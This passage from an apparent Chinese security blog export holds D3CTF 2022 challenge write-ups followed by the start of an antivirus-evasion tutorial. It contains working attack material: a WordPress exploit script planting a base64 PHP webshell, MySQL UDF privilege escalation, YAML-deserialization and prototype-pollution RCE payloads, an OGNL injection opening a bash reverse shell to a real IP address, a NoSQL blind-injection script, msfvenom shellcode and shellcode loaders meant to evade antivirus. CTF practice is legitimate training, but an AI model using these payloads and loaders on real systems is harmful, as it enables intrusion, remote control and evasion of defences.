class=\"line\"><span class=\"string\">GdWRDZGRLVHNLUHo0PSc7CmZpbGVfcHV0X2NvbnRlbnRzKF9fRElSX18uJy8uLi8uLi91cGxvYWRzLzIwMjIvMDMvMS5</span></span><br><span class=\"line\"><span class=\"string\">waHAnLGJhc2U2NF9kZWNvZGUoJGIpKTsKPz5bL3BocF9ldmVyeXdoZXJlXQo=&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tgetShell_data = &#123;</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;action&quot;</span>: <span class=\"string\">&quot;parse-media-shortcode&quot;</span>,</span><br><span class=\"line\">\t\t<span class=\"string\">&quot;shortcode&quot;</span>: base64.b64decode(encoded_payload),</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tsess.post(getShell_url, data=getShell_data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">\tgetShell()</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\tmain()</span><br></pre></td></tr></table></figure>\n\n<p>payload为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">[php_everywhere]&lt;?php print(__DIR__);$b&#x3D;&#39;PD9waHAKZXZhbCgkX1BPU1RbJ2FudCddKTsKPz4&#x3D;&#39;;file_put_contents(__DIR__.&#39;&#x2F;..&#x2F;..&#x2F;uploads&#x2F;2022&#x2F;03&#x2F;1.php&#39;,base64_decode($b));?&gt;[&#x2F;php_everywhere]</span><br></pre></td></tr></table></figure>\n\n<p>getshell之后翻找 wp-config.php 文件来得到 MySQL 的相关配置</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; ** Database settings - You can get this info from your web host ** &#x2F;&#x2F;</span><br><span class=\"line\">&#x2F;** The name of the database for WordPress *&#x2F;</span><br><span class=\"line\">define( &#39;DB_NAME&#39;, &#39;wordpress&#39; );</span><br><span class=\"line\">&#x2F;** Database username *&#x2F;</span><br><span class=\"line\">define( &#39;DB_USER&#39;, &#39;root&#39; );</span><br><span class=\"line\">&#x2F;** Database password *&#x2F;</span><br><span class=\"line\">define( &#39;DB_PASSWORD&#39;, &#39;9Z98g4nmbJxrF5aYHvGaatyi354WxYyp&#39; );</span><br><span class=\"line\">&#x2F;** Database hostname *&#x2F;</span><br><span class=\"line\">define( &#39;DB_HOST&#39;, &#39;127.0.0.1:3306&#39; );</span><br><span class=\"line\">&#x2F;** Database charset to use in creating database tables. *&#x2F;</span><br><span class=\"line\">define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );</span><br><span class=\"line\">&#x2F;** The database collate type. Don&#39;t change this if in doubt. *&#x2F;</span><br><span class=\"line\">define( &#39;DB_COLLATE&#39;, &#39;&#39; );</span><br></pre></td></tr></table></figure>\n\n<p>可以发现是使用高权限账户来链接数据库的 打一个 udf 提权就可以拿到 shell，flag 在根目录下</p>\n<p>然后写一个跳板操作数据库</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; mysql.php</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(E_ALL);</span><br><span class=\"line\">$mysqli &#x3D; new mysqli(&quot;127.0.0.1&quot;,&quot;root&quot;,&quot;9Z98g4nmbJxrF5aYHvGaatyi354WxYyp&quot;,&quot;wordpress&quot;);</span><br><span class=\"line\">$tmp &#x3D; $mysqli-&gt;query($_POST[&#39;sql&#39;]);</span><br><span class=\"line\">$result &#x3D; $tmp-&gt;fetch_all();</span><br><span class=\"line\">var_dump($result);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>打MYSQL udf ，sqlmap中或者msf中自带就行</p>\n<blockquote>\n<p>show variables like ‘%plugin%’; 查看插件库路径</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">SELECT 0x7f454c...... INTO DUMPFILE &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;udf.so&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">SELECT sys_eval(&#39;ls &#x2F;&#39;);</span><br><span class=\"line\"></span><br><span class=\"line\">SELECT sys_eval(&#39;cat &#x2F;ff114499_i5_h3Re&#39;);</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"d3oj\"><a href=\"#d3oj\" class=\"headerlink\" title=\"d3oj\"></a>d3oj</h1><p>找到源码：<a href=\"https://github.com/syzoj/syzoj\">syzoj/syzoj: 一个用于算法竞赛的在线评测系统。An online judge system for algorithm competition. (github.com)</a></p>\n<h2 id=\"非预期解\"><a href=\"#非预期解\" class=\"headerlink\" title=\"非预期解\"></a>非预期解</h2><h3 id=\"YAML-反序列化漏洞-WS-2019-0063\"><a href=\"#YAML-反序列化漏洞-WS-2019-0063\" class=\"headerlink\" title=\"YAML 反序列化漏洞 WS-2019-0063\"></a>YAML 反序列化漏洞 WS-2019-0063</h3><p>上传下面的数据(data.yml)到创建的题目可以造成rce</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123; toString: !&lt;tag:yaml.org,2002:js&#x2F;function&gt; &#39;function ()&#123;app.use(&quot;&#x2F;rce&quot;,</span><br><span class=\"line\">(q,r)&#x3D;&gt;r.send(eval(q.body.c)));&#125;&#39; &#125; : 1</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"任意登录\"><a href=\"#任意登录\" class=\"headerlink\" title=\"任意登录\"></a>任意登录</h2><p><a href=\"https://github.com/syzoj/syzoj/blob/master/app.js#L276\">https://github.com/syzoj/syzoj/blob/master/app.js#L276</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">if (req.cookies.login) &#123;</span><br><span class=\"line\">let obj;</span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">obj &#x3D; JSON.parse(req.cookies.login);</span><br><span class=\"line\">User.findOne(&#123; where: &#123; username: obj[0], password: obj[1] &#125; &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>发送下面的数据可以登录任意用户</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">password: &#123; password: 1 &#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"CVE-2020-8158\"><a href=\"#CVE-2020-8158\" class=\"headerlink\" title=\"CVE-2020-8158\"></a>CVE-2020-8158</h2><p>发送下面的数据到 {host}/article/0/edit 可以rce</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">data &#x3D; &#123;&quot;title&quot;:&quot;rce&quot;,&quot;content&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;ee;app.use(&#39;&#x2F;rce&#39;,</span><br><span class=\"line\">(q,r)&#x3D;&gt;r.send(eval(q.body.c)));return &#39;rce!&#39;;&#x2F;&#x2F;&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"ezsql\"><a href=\"#ezsql\" class=\"headerlink\" title=\"ezsql\"></a>ezsql</h1><ul>\n<li>mybatis</li>\n<li>OGNL表达式</li>\n</ul>\n<p>dockerfile.bak</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">FROM maven:latest as builder1</span><br><span class=\"line\"></span><br><span class=\"line\">WORKDIR &#x2F;build</span><br><span class=\"line\">ADD . .</span><br><span class=\"line\">ADD .&#x2F;settings-docker.xml &#x2F;root&#x2F;.m2&#x2F;settings.xml</span><br><span class=\"line\">RUN mvn clean package</span><br><span class=\"line\"></span><br><span class=\"line\">FROM debian:buster-slim as builder2</span><br><span class=\"line\"></span><br><span class=\"line\">ADD readflag.c &#x2F;readflag.c</span><br><span class=\"line\">RUN apt update &amp;&amp; apt install -y gcc</span><br><span class=\"line\">RUN gcc &#x2F;readflag.c -o &#x2F;readflag</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">FROM openjdk:11-jdk</span><br><span class=\"line\"></span><br><span class=\"line\">WORKDIR &#x2F;app</span><br><span class=\"line\">COPY --from&#x3D;builder1 &#x2F;build&#x2F;target&#x2F;ezsql-0.0.1-SNAPSHOT.jar .</span><br><span class=\"line\">COPY --from&#x3D;builder2 &#x2F;readflag &#x2F;readflag</span><br><span class=\"line\">RUN echo d3ctf&#123;FLAG&#125; &gt; &#x2F;flag</span><br><span class=\"line\">RUN chmod 0400 &#x2F;flag</span><br><span class=\"line\">RUN chmod 0444 Dockerfile ezsql-0.0.1-SNAPSHOT.jar</span><br><span class=\"line\">RUN chown root:root &#x2F;flag ezsql-0.0.1-SNAPSHOT.jar Dockerfile</span><br><span class=\"line\">RUN chmod 4555 &#x2F;readflag</span><br><span class=\"line\">RUN useradd d3ctf</span><br><span class=\"line\">USER d3ctf</span><br><span class=\"line\"></span><br><span class=\"line\">ENTRYPOINT [ &quot;java&quot;, &quot;-jar&quot;, &quot;ezsql-0.0.1-SNAPSHOT.jar&quot;]</span><br></pre></td></tr></table></figure>\n\n<p>还给了一个jar包，反编译看一下,jd-gui反编译出来缺少代码，使用idea反编译</p>\n<p>能看出一处sql注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/1c84117cbe29babbcfb6d0fdcf3ae6bd.png\" alt=\"image-20220311133622626\"></p>\n<p>发现后端是用mybatis</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/wp/38ece7e2ea25e2a57485d118361f74aa.png\" alt=\"image-20220311134050464\"></p>\n<p>wp：<strong>mybatis 的 SQL 映射支持使用 OGNL 表达式， VoteProvider 直接使用字符串拼接来生成 SQL 语句，如果错误地把 用户输入拼接进去，不仅会发生 SQL 注入，还会引发 OGNL 注入</strong></p>\n<p>表达式注入rce</p>\n<blockquote>\n<p>${xxx} 告诉 mybatis 在此处创建一个预处理语句参数，借助 OGNL 来实现参数 SQL 语句的参数绑定。 如果用户能够控制 ${} 中的内容，就能通过 OGNL 表达式来注入到达 RCE 的目的</p>\n</blockquote>\n<p><strong>题目里使用的 org.mybatis.spring.boot 是最新的 2.2.2 版本，对应的 OGNL 依赖的版本为 3.3.0, 高版本的 OGNL 启用了 stricter invocation mode ，使用硬编码的方式 ban 掉了一些 class, 其中就包括 java.lang.Runtime ，要 bypass 得借助反射</strong></p>\n<p>payload，整体urlencode一次</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;vote&#x2F;getDetailedVoteById?vid&#x3D;3) union select null,&quot;$&#123;#this.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[14].invoke(#this.getClass().forName(&#39;java.lang.Runtime&#39;).getMethods()[6].invoke(),&#39;bash,-c,bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;121.5.169.223&#x2F;39876 0&gt;&amp;1&#39;.split(&#39;,&#39;))&#125;&quot;,null,null,null--+</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"d3fGo\"><a href=\"#d3fGo\" class=\"headerlink\" title=\"d3fGo\"></a>d3fGo</h1><p>给了一个ELF文件，go编译的web服务端,不会弄，也尝试使用ida提取信息，太菜了，不会弄，最后是个Nosql注入</p>\n<p>WP：</p>\n<p>fgo 里搜/api搜到/api/Admini/Login。</p>\n<p>fgo 里搜*struct 搜到seeecret字段。</p>\n<p>粗略查看/api/Admini/Login的逻辑，如果提交的数据有seeecret字段 则mongodb查询参数是username password seeecret三个字段，否则是username password 两个字段。</p>\n<p>seeecret字段 mongodb布尔盲注出flag。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;api&#x2F;Admini&#x2F;Login</span><br><span class=\"line\">*struct &#123; Username interface &#123;&#125; \\&quot;json:\\\\\\&quot;username\\\\\\&quot;\\&quot;; Password interface &#123;&#125; \\&quot;json:\\\\\\&quot;password\\\\\\&quot;\\&quot;; Seeecret interface &#123;&#125; \\&quot;json:\\\\\\&quot;seeecret\\\\\\&quot;\\&quot; &#125;</span><br></pre></td></tr></table></figure>\n\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string,re</span><br><span class=\"line\">ip = <span class=\"string\">&quot;http://7b470ec8f6.fgo-d3ctf-challenge.n3ko.co&quot;</span></span><br><span class=\"line\">proxies = &#123;&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    flag = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> string.printable:</span><br><span class=\"line\">            t = flag + re.escape(i)</span><br><span class=\"line\">            resp = requests.post(ip + <span class=\"string\">&quot;/api/Admini/Login&quot;</span>,json=&#123;</span><br><span class=\"line\">                <span class=\"string\">&quot;username&quot;</span>:&#123;<span class=\"string\">&quot;$ne&quot;</span>:<span class=\"string\">&quot;123&quot;</span>&#125;,<span class=\"string\">&quot;password&quot;</span>:&#123;<span class=\"string\">&quot;$ne&quot;</span>:<span class=\"string\">&quot;123&quot;</span>&#125;,</span><br><span class=\"line\">                <span class=\"string\">&quot;seeecret&quot;</span>:&#123;<span class=\"string\">&quot;$regex&quot;</span>:<span class=\"string\">&quot;^&quot;</span>+t&#125;</span><br><span class=\"line\">            &#125;,proxies=proxies)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> resp.status_code == <span class=\"number\">200</span>:</span><br><span class=\"line\">                flag = t</span><br><span class=\"line\">                print(flag)</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">main()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n","categories":["赛题wp"]},{"title":"免杀入门","url":"/2024/05/17/bypassav/","content":"<h1 id=\"免杀入门\"><a href=\"#免杀入门\" class=\"headerlink\" title=\"免杀入门\"></a>免杀入门</h1><p>环境：cobalt strike 4.4 、自实现profile、全文使用c类型shellcode。</p>\n<p>PS：本人水平低下，针对syscall等底层原理内容实在难于下手，免得乱写一通。</p>\n<a id=\"more\"></a>\n\n<h1 id=\"shellcode的编写\"><a href=\"#shellcode的编写\" class=\"headerlink\" title=\"shellcode的编写\"></a>shellcode的编写</h1><h2 id=\"手动编写-x\"><a href=\"#手动编写-x\" class=\"headerlink\" title=\"手动编写(x)\"></a>手动编写(x)</h2><p>手动编写暂时挖坑</p>\n<h2 id=\"c2生成\"><a href=\"#c2生成\" class=\"headerlink\" title=\"c2生成\"></a>c2生成</h2><p>利用msf生成shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f c -o shellcode.c</span><br><span class=\"line\">msfvenom -p windows&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f c -o shellcode2.c</span><br><span class=\"line\">msfvenom -p windows&#x2F;x64&#x2F;exec cmd&#x3D;&quot;calc.exe&quot; -f raw -o calc</span><br></pre></td></tr></table></figure>\n\n<p>x64,calc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsigned char buf[] &#x3D;</span><br><span class=\"line\">&quot;\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50&quot;</span><br><span class=\"line\">&quot;\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52&quot;</span><br><span class=\"line\">&quot;\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a&quot;</span><br><span class=\"line\">&quot;\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41&quot;</span><br><span class=\"line\">&quot;\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52&quot;</span><br><span class=\"line\">&quot;\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48&quot;</span><br><span class=\"line\">&quot;\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40&quot;</span><br><span class=\"line\">&quot;\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48&quot;</span><br><span class=\"line\">&quot;\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41&quot;</span><br><span class=\"line\">&quot;\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1&quot;</span><br><span class=\"line\">&quot;\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c&quot;</span><br><span class=\"line\">&quot;\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01&quot;</span><br><span class=\"line\">&quot;\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a&quot;</span><br><span class=\"line\">&quot;\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b&quot;</span><br><span class=\"line\">&quot;\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00&quot;</span><br><span class=\"line\">&quot;\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b&quot;</span><br><span class=\"line\">&quot;\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd&quot;</span><br><span class=\"line\">&quot;\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0&quot;</span><br><span class=\"line\">&quot;\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff&quot;</span><br><span class=\"line\">&quot;\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot;;</span><br></pre></td></tr></table></figure>\n\n<p>x86,calc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsigned char buf[] &#x3D;</span><br><span class=\"line\">&quot;\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50&quot;</span><br><span class=\"line\">&quot;\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26&quot;</span><br><span class=\"line\">&quot;\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7&quot;</span><br><span class=\"line\">&quot;\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78&quot;</span><br><span class=\"line\">&quot;\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3&quot;</span><br><span class=\"line\">&quot;\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01&quot;</span><br><span class=\"line\">&quot;\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58&quot;</span><br><span class=\"line\">&quot;\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3&quot;</span><br><span class=\"line\">&quot;\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a&quot;</span><br><span class=\"line\">&quot;\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x6a\\x01\\x8d&quot;</span><br><span class=\"line\">&quot;\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb&quot;</span><br><span class=\"line\">&quot;\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c&quot;</span><br><span class=\"line\">&quot;\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53&quot;</span><br><span class=\"line\">&quot;\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"shellcode的加载\"><a href=\"#shellcode的加载\" class=\"headerlink\" title=\"shellcode的加载\"></a>shellcode的加载</h1><p><a href=\"https://www.cnblogs.com/henry666/p/17429771.html\">总结加载Shellcode的各种方式 - 亨利其实很坏</a></p>\n<h2 id=\"内联汇编\"><a href=\"#内联汇编\" class=\"headerlink\" title=\"内联汇编\"></a>内联汇编</h2><p>直接嵌入汇编语言调用shellcode，vs中默认不支持x64，仅支持x32位的shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)   &#x2F;&#x2F;data段可读写  </span><br><span class=\"line\">&#x2F;&#x2F;#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;)   &#x2F;&#x2F;不显示窗口 </span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D;</span><br><span class=\"line\">&quot;\\xfc\\xe8\\x82\\x00\\x00\\x00\\x60\\x89\\xe5\\x31\\xc0\\x64\\x8b\\x50&quot;</span><br><span class=\"line\">&quot;\\x30\\x8b\\x52\\x0c\\x8b\\x52\\x14\\x8b\\x72\\x28\\x0f\\xb7\\x4a\\x26&quot;</span><br><span class=\"line\">&quot;\\x31\\xff\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\xc1\\xcf\\x0d\\x01\\xc7&quot;</span><br><span class=\"line\">&quot;\\xe2\\xf2\\x52\\x57\\x8b\\x52\\x10\\x8b\\x4a\\x3c\\x8b\\x4c\\x11\\x78&quot;</span><br><span class=\"line\">&quot;\\xe3\\x48\\x01\\xd1\\x51\\x8b\\x59\\x20\\x01\\xd3\\x8b\\x49\\x18\\xe3&quot;</span><br><span class=\"line\">&quot;\\x3a\\x49\\x8b\\x34\\x8b\\x01\\xd6\\x31\\xff\\xac\\xc1\\xcf\\x0d\\x01&quot;</span><br><span class=\"line\">&quot;\\xc7\\x38\\xe0\\x75\\xf6\\x03\\x7d\\xf8\\x3b\\x7d\\x24\\x75\\xe4\\x58&quot;</span><br><span class=\"line\">&quot;\\x8b\\x58\\x24\\x01\\xd3\\x66\\x8b\\x0c\\x4b\\x8b\\x58\\x1c\\x01\\xd3&quot;</span><br><span class=\"line\">&quot;\\x8b\\x04\\x8b\\x01\\xd0\\x89\\x44\\x24\\x24\\x5b\\x5b\\x61\\x59\\x5a&quot;</span><br><span class=\"line\">&quot;\\x51\\xff\\xe0\\x5f\\x5f\\x5a\\x8b\\x12\\xeb\\x8d\\x5d\\x6a\\x01\\x8d&quot;</span><br><span class=\"line\">&quot;\\x85\\xb2\\x00\\x00\\x00\\x50\\x68\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb&quot;</span><br><span class=\"line\">&quot;\\xf0\\xb5\\xa2\\x56\\x68\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x3c\\x06\\x7c&quot;</span><br><span class=\"line\">&quot;\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x53&quot;</span><br><span class=\"line\">&quot;\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">\t\tlea eax,buf</span><br><span class=\"line\">\t\tcall eax</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>mov eax, offset ShellCode 可以用 lea eax, ShellCode 代替</p>\n<p>jmp 也可以用 call 代替</p>\n<p><strong>添加花指令：</strong></p>\n<p><a href=\"https://blog.csdn.net/m0_46296905/article/details/117336574\">花指令简析_花指令生成</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)</span><br><span class=\"line\">unsigned char shellcode[] &#x3D;&quot;&quot;;</span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t__asm</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        mov eax, offset shellcode</span><br><span class=\"line\">        _emit 0xFF  </span><br><span class=\"line\">        _emit 0xE0</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"函数指针执行\"><a href=\"#函数指针执行\" class=\"headerlink\" title=\"函数指针执行\"></a>函数指针执行</h2><p><strong>将buf的首地址强转为函数指针并调用,而buf的首地址内容为shellcode</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma comment(linker, &quot;&#x2F;section:.data,RWE&quot;)  &#x2F;&#x2F;data段可读写执行</span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;) &#x2F;&#x2F;不显示windows窗口  </span><br><span class=\"line\"></span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">void main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t( (void(*)(void)) &amp; buf)();</span><br><span class=\"line\">\t&#x2F;&#x2F; ( (void(WINAPI*)(void)) &amp; buf)();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>理解 <code>(*(void (*)()) lpBaseAddress)()</code></p>\n<p>就是把从指定地址开始的命令当作函数进行调用执行。</p>\n<ol>\n<li><code>void (*)()</code> 是一个无参数、无返回类型的函数指针。</li>\n<li><code>(void (*)())lpBaseAddress</code> 是将lpBaseAddress强转为函数指针类型。</li>\n<li><code>(*(void (*)()) lpBaseAddress)()</code> 就是通过函数指针(相当于这个格式<code>(*函数指针)()</code>)进行函数调用。</li>\n</ol>\n<p>没有调用WinApi，可对shellcode进行加密编码</p>\n<h2 id=\"申请动态内存加载\"><a href=\"#申请动态内存加载\" class=\"headerlink\" title=\"申请动态内存加载\"></a>申请动态内存加载</h2><p>通过调用winapi：VirtualAlloc 主要用于在进程的虚拟地址空间中分配一块内存，这块内存可以被用于多种目的，包括作为堆、栈、映射文件等。将shellcode复制到申请的地址，通过 函数指针执行 或 创建线程执行</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">申请内存页时，可以在Shellcode读入时，申请一个普通的可读写的内存页，然后再通过VirtualProtect改变它的属性 -&gt; 可执行。这样也能规避掉一些特征查杀。</span><br></pre></td></tr></table></figure>\n\n<p><strong>函数指针执行：</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#pragma comment(linker,&quot;&#x2F;subsystem:\\&quot;Windows\\&quot; &#x2F;entry:\\&quot;mainCRTStartup\\&quot;&quot;) &#x2F;&#x2F;windows控制台程序不出黑窗口</span><br><span class=\"line\">unsigned char buf[] &#x3D; &quot;shellcode is here&quot;;</span><br><span class=\"line\">main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tchar *Memory; </span><br><span class=\"line\">\tMemory&#x3D;VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">\tmemcpy(Memory, buf, sizeof(buf));</span><br><span class=\"line\">\t((void(*)())Memory)();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><strong>创建线程执行：</strong></p>\n<p>在创建线程时需要进行等待子线程完成，sleep一会或者WaitForSingleObject等待信号</p>\n<blockquote>\n<p>main退出时自动调用ExitProcess()，操作系统终止所有运行的线程。WaitForSingleObject保证main在子线程运行期间不返回。</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 